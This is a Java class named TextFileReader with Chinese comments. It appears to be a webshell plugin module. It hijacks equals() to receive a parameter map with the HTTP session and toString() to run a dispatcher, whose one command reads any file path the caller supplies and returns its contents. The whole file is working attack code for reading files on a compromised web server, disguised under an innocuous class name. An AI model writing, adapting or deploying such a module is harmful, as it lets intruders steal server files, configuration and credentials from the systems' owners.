import java.util.HashMap;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class TextFileReader {
    private HashMap parameterMap;
    public static Object Session;

    public TextFileReader() {
    }

    /**
     * 一个非常规的 equals 实现。它不检查相等性，
     * 而是用此方法作为向对象传递参数的方式，通过设置内部的 parameterMap。
     * @param paramObject 一个预期为 HashMap 的对象。
     * @return 如果参数映射设置成功，则返回 true，否则返回 false。
     */
    public boolean equals(Object paramObject) {
        try {
            this.parameterMap = (HashMap)paramObject;
            this.Session = this.parameterMap.get("httpSession");
        } catch (Exception e) {
            return false;
        }
        return true;
    }

    /**
     * 一个非常规的 toString 实现。它通过 `run()` 触发主要逻辑，
     * 将结果存储在参数映射中，然后将该映射置为 null。
     * @return 总是返回 null。
     */
    public String toString() {
        this.parameterMap.put("result", this.run().getBytes());
        this.parameterMap = null;
        return null;
    }

    /**
     * 主入口方法，根据methodName分发到具体功能
     */
    public String run() {
        String methodName = this.get("methodName");
        try {
            if (methodName == null) {
                return "error:methodName is null";
            }

            if (methodName.equals("readFileText")) {
                String path = this.get("path");
                return "ok:" + this.readFileText(path);
            }

            return "error:methodName is not found";
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    /**
     * 读取文件文本内容
     */
    public String readFileText(String path) throws IOException {
        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new FileReader(path))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
        }
        return content.toString();
    }

    /**
     * 从参数映射中获取字符串值
     */
    public String get(String key) {
        Object value = this.parameterMap.get(key);
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
            return (String) value;
        }
        if (value instanceof byte[]) {
            try {
                return new String((byte[]) value, "UTF-8");
            } catch (Exception e) {
                return null;
            }
        }
        return value.toString();
    }
}